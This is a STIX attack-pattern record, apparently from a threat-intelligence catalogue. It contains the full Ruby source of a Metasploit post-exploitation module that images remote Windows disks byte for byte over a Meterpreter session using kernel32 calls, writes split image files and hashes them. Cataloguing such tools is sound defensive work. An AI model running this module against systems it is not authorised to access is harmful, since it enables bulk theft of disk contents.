{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--af7f4c80-b4b6-41bc-ba87-d1c42453ccdb",
    "created": "2024-08-14T16:33:06.172882Z",
    "modified": "2024-08-14T16:33:06.172886Z",
    "name": "Windows Gather Forensic Imaging",
    "description": "This module will perform byte-for-byte imaging of remote disks and volumes 'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/forensics/imager.rb",
            "external_id": "imager.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n#\n# Forensic byte-for-byte imaging of remote disks and volumes\n#\n# R. Wesley McGrew wesley@mcgrewsecurity.com\n#    http://mcgrewsecurity.com\n# Mississippi State University National Forensics Training Center\n#    http://msu-nftc.org\n\nrequire 'digest/md5'\nrequire 'digest/sha1'\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Forensic Imaging',\n        'Description' => %q{This module will perform byte-for-byte imaging of remote disks and volumes},\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => ['Wesley McGrew <wesley[at]mcgrewsecurity.com>'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('DEVICE', [true, 'Device to image (use enum_drives for possible names)', nil]),\n        OptString.new('OUTFILE', [false, 'Output filename without extension', 'image']),\n        OptInt.new('SPLIT', [false, 'Split image size, in bytes', 1610612736]),\n        OptInt.new('BLOCKSIZE', [false, 'Block size, in bytes (multiples of 512)', 1048576]),\n        OptInt.new('SKIP', [false, 'Skip this many blocks before beginning', 0]),\n        OptInt.new('COUNT', [false, 'Image only this many blocks (0 - read till end)', 0])\n      ]\n    )\n  end\n\n  def run\n    devname = datastore['DEVICE']\n    base_filename = datastore['OUTFILE']\n    split = datastore['SPLIT']\n    block_size = datastore['BLOCKSIZE']\n    skip = datastore['SKIP']\n    num_to_read = datastore['COUNT']\n\n    invalid_handle_value = 0xFFFFFFFF\n    invalid_set_file_pointer = 0xFFFFFFFF\n    fsctl_allow_extended_dasd_io = 0x00090083\n    ioctl_disk_get_drive_geometry_ex = 0x000700A0\n\n    r = client.railgun.kernel32.CreateFileA(devname, 'GENERIC_READ',\n                                            0x3, nil, 'OPEN_EXISTING', 'FILE_ATTRIBUTE_READONLY', 0)\n    handle = r['return']\n\n    if handle == invalid_handle_value\n      print_error(\"Could not open #{devname}\")\n      raise Rex::Script::Completed\n    end\n\n    r = client.railgun.kernel32.DeviceIoControl(handle, fsctl_allow_extended_dasd_io, nil, 0, 0, 0, 4, nil)\n\n    ioctl = client.railgun.kernel32.DeviceIoControl(handle, ioctl_disk_get_drive_geometry_ex,\n                                                    '', 0, 200, 200, 4, '')\n    if ioctl['GetLastError'] == 6\n      ioctl = client.railgun.kernel32.DeviceIoControl(handle, ioctl_disk_get_drive_geometry_ex,\n                                                      '', 0, 200, 200, 4, '')\n    end\n    geometry = ioctl['lpOutBuffer']\n\n    disk_size = geometry[24, 31].unpack('Q')[0]\n\n    finished = false\n    skip_counter = 0\n    if num_to_read != 0\n      count = 0\n    end\n    file_number = 1\n    file_data_count = 0\n    disk_bytes_count = 0\n    fp = ::File.new('%s.%03i' % [base_filename, file_number], 'w')\n    print_line(\"Started imaging #{devname} to %s.%03i\" % [base_filename, file_number])\n\n    md5_hash = Digest::MD5.new\n    sha1_hash = Digest::SHA1.new\n\n    while finished != true\n      if skip_counter < skip\n        print_line(\"Skipped #{block_size} bytes\")\n        r = client.railgun.kernel32.SetFilePointer(handle, block_size, 0, 1)\n        if r['return'] == invalid_set_file_pointer && (r['GetLastError'] != 0)\n          print_error('Skipped past the end of file?')\n          raise Rex::Script::Completed\n        end\n        skip_counter += 1\n        next\n      end\n\n      if (disk_size - disk_bytes_count) < block_size\n        block_size = disk_size - disk_bytes_count\n        finished = true\n      end\n      r = client.railgun.kernel32.ReadFile(handle, block_size, block_size, 4, nil)\n      disk_bytes_count += block_size\n      if disk_bytes_count == disk_size\n        finished = true\n      end\n\n      data = r['lpBuffer'][0, r['lpNumberOfBytesRead']]\n\n      if num_to_read != 0\n        count += 1\n        if count == num_to_read\n          finished = true\n        end\n      end\n\n      md5_hash << data\n      sha1_hash << data\n\n      fp.syswrite(data)\n      file_data_count += data.length\n      next unless file_data_count >= split\n\n      fp.close\n      next unless finished != true\n\n      file_number += 1\n      file_data_count = 0\n      fp = ::File.new('%s.%03i' % [base_filename, file_number], 'w')\n      print_line('...continuing with %s.%03i' % [base_filename, file_number])\n    end\n    fp.close\n\n    print_line('Finished!')\n    print_line(\"MD5  : #{md5_hash}\")\n    print_line(\"SHA1 : #{sha1_hash}\")\n\n    client.railgun.kernel32.CloseHandle(handle)\n  end\nend\n"
}